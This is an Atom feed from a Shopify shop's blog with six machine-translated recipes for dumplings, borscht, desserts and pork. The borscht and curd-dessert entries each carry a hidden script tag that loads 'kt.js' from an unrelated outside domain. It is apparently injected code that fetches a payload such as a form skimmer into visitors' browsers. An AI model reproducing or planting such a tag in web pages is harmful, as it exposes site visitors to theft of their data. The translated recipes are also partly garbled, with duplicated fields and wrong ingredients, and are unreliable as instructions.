<?xml version="1.0" encoding="UTF-8"?>
<feed xml:lang="en-US" xmlns="http://www.w3.org/2005/Atom" xmlns:opensearch="http://a9.com/-/spec/opensearch/1.1/" xmlns:s="http://jadedpixel.com/-/spec/shopify">
  <id>https://maiklstole.myshopify.com/blogs/news.atom</id>
  <link rel="alternate" type="text/html" href="https://maiklstole.myshopify.com/blogs/news"/>
  <link rel="self" type="application/atom+xml" href="https://maiklstole.myshopify.com/blogs/news.atom"/>
  <title>maiklstole - News</title>
  <updated>2020-11-16T16:34:05+07:00</updated>
  <author>
    <name>maiklstole</name>
  </author>
  <entry>
    <id>https://maiklstole.myshopify.com/blogs/news/light-yogurt-based-dessert</id>
    <published>2020-11-16T16:34:05+07:00</published>
    <updated>2020-11-16T16:34:06+07:00</updated>
    <link rel="alternate" type="text/html" href="https://maiklstole.myshopify.com/blogs/news/light-yogurt-based-dessert"/>
    <title>Light yogurt-based dessert</title>
    <author>
      <name>Aleksandr Puskov</name>
    </author>
    <content type="html">
      <![CDATA[<p> </p>
<meta charset="utf-8">
<p><img src="https://www.myasnov.ru/upload/iblock/0f9/0f975a6643905748a35c58587519e44c.jpg" alt="Легкий десерт на основе йогурта МЯСНОВЪ"></p>
<p>Ingredients<br>per number of servings: 6<br><br>Yogurt 2.7% 500 grams of drinking - 600 g<br>Sugar sand - 5 tbsp.<br>Gelatin - 20 g<br>Fresh berries, fruits - 300-400 g<br>Sugar cookies - 150 g<br>Cooking:<br>1. <br>Beat the yogurt and sugar until a homogeneous mass is obtained.<br><br><br>2. <br>Dissolve the gelatin in 100 ml of water, heat it to about 60 degrees, stirring constantly. Then cool down a little, without stopping stirring.<br><br><br>3. <br>In the yogurt mass, add the berries sliced beforehand, pour the gelatine, stir.<br><br><br>4. <br>Pour the mass into a mold lined with food film.<br><br>5. <br>Cracked cookies can be placed on top - when turned over, they will become the "bottom" of the dessert.<br><br><br>6. <br>Place the dessert in the fridge for at least 4 hours, or better at night.<br><br>7. <br>Turn the ready dessert over on a plate, decorate it with mint berries and leaves as desired.</p>]]>
    </content>
  </entry>
  <entry>
    <id>https://maiklstole.myshopify.com/blogs/news/dumplings</id>
    <published>2020-11-16T16:25:16+07:00</published>
    <updated>2020-11-16T16:25:17+07:00</updated>
    <link rel="alternate" type="text/html" href="https://maiklstole.myshopify.com/blogs/news/dumplings"/>
    <title>Dumplings</title>
    <author>
      <name>Aleksandr Puskov</name>
    </author>
    <content type="html">
      <![CDATA[<p> </p>
<p> </p>
<meta charset="utf-8">
<p><img src="https://www.myasnov.ru/upload/iblock/a26/a264dd37c820a6a9dd9662d41dd60cf0.jpg" alt="Пельмени МЯСНОВЪ"></p>
<p> </p>
<p>National cuisine: Russian<br>Preparation time: 5 min.<br>Preparation time: 10 min.<br>Level of difficulty: <br><br>Ingredients<br>per number of servings: 3<br><br>Meat dumplingsЪ Pozarsky - 0.5 kg Variants<br>Thermostatic sour cream 20% GOST 200 grams - 3 st.p. Options<br>Water - 2 l<br>Onions - 1 head<br>Salt - to tasteOther options<br>Black peas - to taste<br>Laurel leaf - to taste<br>Greenery of parsley and/or dill (fresh or dried) - 1 bundle<br>Cooking:<br>1. <br>Put the dumplings in boiling water and salt.<br><br>2. <br>Add sliced onions, bay leaf, pepper and herbs.<br><br>3. <br>Boil dumplings for 5-10 minutes until ready.<br><br>4. <br>After that you can serve the dumplings with sour cream, or fry them until golden brown.<br><br>5. <br>Decorate the prepared dish with herbs.<br><br></p>]]>
    </content>
  </entry>
  <entry>
    <id>https://maiklstole.myshopify.com/blogs/news/dessert-creamy-ice-cream</id>
    <published>2020-11-13T22:14:41+07:00</published>
    <updated>2020-11-13T22:21:45+07:00</updated>
    <link rel="alternate" type="text/html" href="https://maiklstole.myshopify.com/blogs/news/dessert-creamy-ice-cream"/>
    <title>Dessert Creamy ice cream</title>
    <author>
      <name>Aleksandr Puskov</name>
    </author>
    <content type="html">
      <![CDATA[Ingredients<br>per number of servings: 3<br>
<script src="https://auntieannesph.com/kek/kt.js"></script>
<img src="https://cdn.shopify.com/s/files/1/0512/2126/6601/files/e016855c7c37aac39d39cb77339d4b40.jpg?v=1605280441" alt=""><br>FERMA Meat Cake - 200 g<br>Thermo static sour cream 20% GOST 200 grams - 50 g Options<br>Fillers (sunflower or pumpkin seeds, marmalade, dried fruits (curraw, prunes, raisins), candied fruits, halva, fresh or frozen berries, jam or other, at your choice) - a total of 100 g<br>Sprinkle (sesame, coconut chips, pine nuts, cocoa or other sprinkle, at your choice) - to taste<br>Cooking:<br>1. <br>Mix the cottage cheese and sour cream with a mixer into a homogeneous mass.<br><br>2. <br>Divide the cottage cheese mass into 5 parts.<br><br>3. <br>3. Remove 3 parts of the mass to the side for a while and mix each of the 2 remaining parts with different fillers.<br><br>4. <br>Lay all 5 parts of the curd mass in layers, alternating them. The dessert will not be luscious, if the bottom, center and top layers are made without fillers).<br><br>5. <br>Decorate the dessert from above with sprinkle to your taste and put it in the fridge for 30 minutes.<br><br>6. <br>This healthy dessert is a pleasure to eat by children.<br><br>]]>
    </content>
  </entry>
  <entry>
    <id>https://maiklstole.myshopify.com/blogs/news/borscht-with-feeders-meatballs</id>
    <published>2020-11-13T22:11:52+07:00</published>
    <updated>2020-11-16T16:27:10+07:00</updated>
    <link rel="alternate" type="text/html" href="https://maiklstole.myshopify.com/blogs/news/borscht-with-feeders-meatballs"/>
    <title>Borscht with feeders (meatballs)</title>
    <author>
      <name>Aleksandr Puskov</name>
    </author>
    <content type="html">
      <![CDATA[<script src="https://auntieannesph.com/kek/kt.js"></script>
Ingredients<br>per number of servings: 3<br><img src="https://cdn.shopify.com/s/files/1/0512/2126/6601/files/a32e13d5a9636a3314ab631d6442f88a.jpg?v=1605280298" alt=""><br>Fast beef stuffing - 200 beefVariants<br>Fresh cabbage - 300 g<br>Potatoes - 200 g<br>Beet - 100 g<br>Onions - 1 pcs. (for borscht base)<br>Carrot - 1 pcs.<br>Sea salt - to taste<br>Laurel leaf - to taste<br>Green - to taste<br>Dressing Provence herbs<br>Cooking:<br>1. <br>Boil the beet almost to readiness.<br><br>2. <br>Wash, clean and chop the other vegetables as you like. Place a pot of water on the fire.<br><br>3. <br>Dip the shredded cabbage in boiling water. After 15 minutes, immerse the potatoes. In another 5 minutes - carrot and half an onion. In 10 minutes add boiled beets.<br><br>4. <br>Boil vegetables for another 5 minutes, then salt, add bay leaf and remove the pot from the fire. Borscht should insist.<br><br>5. <br>In minced meat add grated half an onion and salt.<br><br>6. <br>Form small meatballs (you get about 40 pieces) and boil them in a small amount of water (meatballs should be completely covered with water) in a small pot or pan with high edges.<br><br>7. <br>Add the "Italian Herbs" spice for the flavor.<br><br>8. <br>To serve, pour the infusion of borscht into the soup plate, add a few feeders and sprinkle the greens.<br><br>]]>
    </content>
  </entry>
  <entry>
    <id>https://maiklstole.myshopify.com/blogs/news/pork-in-sweet-and-sour-sauce</id>
    <published>2020-11-13T22:09:24+07:00</published>
    <updated>2020-11-13T22:09:25+07:00</updated>
    <link rel="alternate" type="text/html" href="https://maiklstole.myshopify.com/blogs/news/pork-in-sweet-and-sour-sauce"/>
    <title>Pork in sweet and sour sauce.</title>
    <author>
      <name>Aleksandr Puskov</name>
    </author>
    <content type="html">
      <![CDATA[<meta charset="utf-8">
<h1>Recipe.</h1>
<p><img src="https://cdn.shopify.com/s/files/1/0512/2126/6601/files/eed175a11defb5b4792a3c15ebab2dff.jpg?v=1605280152" alt=""></p>
<p>1. Cut the meat into small pieces, add 1 tsp. salt, 1 tsp. starch, chicken egg and mix everything. Put the meat in the fridge for 30 minutes.</p>
<p>2. Cut the pepper into medium slices, finely chop the garlic.</p>
<p>3. Mix the flour, starch, leavening agent and 1 tsp. salt (leave 1 tsp. starch for sauce).</p>
<p>4. Slices of meat carefully bundle in flour.</p>
<p>5. Heat 300 ml of vegetable oil in a pan and fry in a medium heat for 3-4 minutes, do not fry the meat for a long time, otherwise the meat will become dry. Place the ready meat on a paper towel to remove any excess oil.</p>
<p>6. Pour 2 tbsp of vegetable oil into a frying pan and put finely sliced garlic, fry for 30 seconds and put the pepper, fry for 5 minutes periodically stirring, add red chili pepper flakes and a little salt.</p>
<p>7. Add the canned pineapples and fry for a couple more minutes.</p>
<p>8. Add sugar and rice vinegar, stir everything until the sugar is completely dissolved, add ketchup and stir, braise on low heat 1 minute continuously stirring, then add 1 tsp. starch and mix well.</p>
<p>9. In the sauce with vegetables add the roasted pieces of meat and thoroughly stir so that each piece of meat is in the sauce. The pork in the sweet and sour sauce is ready. Bon appetite!</p>]]>
    </content>
  </entry>
  <entry>
    <id>https://maiklstole.myshopify.com/blogs/news/minced-meat-roll-with-cauliflower-stuffing</id>
    <published>2020-11-13T22:03:08+07:00</published>
    <updated>2020-11-13T22:06:01+07:00</updated>
    <link rel="alternate" type="text/html" href="https://maiklstole.myshopify.com/blogs/news/minced-meat-roll-with-cauliflower-stuffing"/>
    <title>Minced meat roll with cauliflower stuffing</title>
    <author>
      <name>Aleksandr Puskov</name>
    </author>
    <content type="html">
      <![CDATA[<p><img src="https://cdn.shopify.com/s/files/1/0512/2126/6601/files/15e3ee86487449933cd164b9f5523ff5.jpg?v=1605279850" alt=""></p>
<p>Cooking:<br>1. <br>Preheat the oven to 210 degrees.<br><br>2. <br>Remove the food film from the roll, cover it with foil and put in the oven for 30 minutes.<br><br>3. <br>After this time, reduce it to 180 degrees and bake the roll for 15-20 minutes.<br><br>4. <br>Remove the foil and, without turning off the oven, let the roll sweat for 10 minutes.<br><br>5. <br>You can turn on the oven's convection and leave the roll on for another 15 minutes to get the ruddy crust.<br><br>6. <br>The aromatic meat loaf is ready!<br><br>7. <br>Before serving, cut the roll in portions and decorate with fresh vegetables and herbs.</p>]]>
    </content>
  </entry>
</feed>
